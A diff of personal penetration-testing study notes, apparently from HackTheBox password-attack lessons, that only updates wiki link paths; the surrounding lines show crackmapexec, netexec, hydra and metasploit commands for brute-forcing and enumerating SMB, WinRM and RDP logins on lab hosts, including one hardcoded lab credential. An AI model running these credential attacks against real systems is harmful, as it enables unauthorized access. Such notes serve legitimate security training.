@@ -2,7 +2,7 @@
 
 https://academy.hackthebox.com/storage/resources/Password-Attacks.zip
 
-##### [[la1n-notes/services/SMB/SMB|SMB]], [[la1n-notes/Web/Injecttions/LDAP/LDAP]], [[mssql]], etc.
+##### [[la1n-notes/Infra/services/SMB/SMB|SMB]], [[la1n-notes/Web/Injecttions/LDAP/LDAP]], [[mssql]], etc.
 https://github.com/byt3bl33d3r/CrackMapExec
 #CrackMapExec 
 ```shell
@@ -15,7 +15,7 @@ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 ```shell
 crackmapexec --verbose smb 10.129.42.197 -u "user" -p "password" --shares
 ```
-#### [[la1n-notes/services/SMB/SMB|SMB]] enumeration
+#### [[la1n-notes/Infra/services/SMB/SMB|SMB]] enumeration
 list shares
 ```bash
 netexec smb 10.129.128.107  -u michael.wrightson -p Cicada$M6Corpb*@Lp#nZpsmbmap -H 10.129.128.107 --shares
@@ -57,7 +57,7 @@ hydra -L user.list -P password.list 10.129.42.197 smb
 ```bash
 hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
 ```
-### Dictionary attack on [[SMB]] use [[metasploit]]
+### Dictionary attack on [[la1n-notes/DRAFTS/SMB]] use [[metasploit]]
 ```shell
 msfconsole -q
 use auxiliary/scanner/smb/smb_login
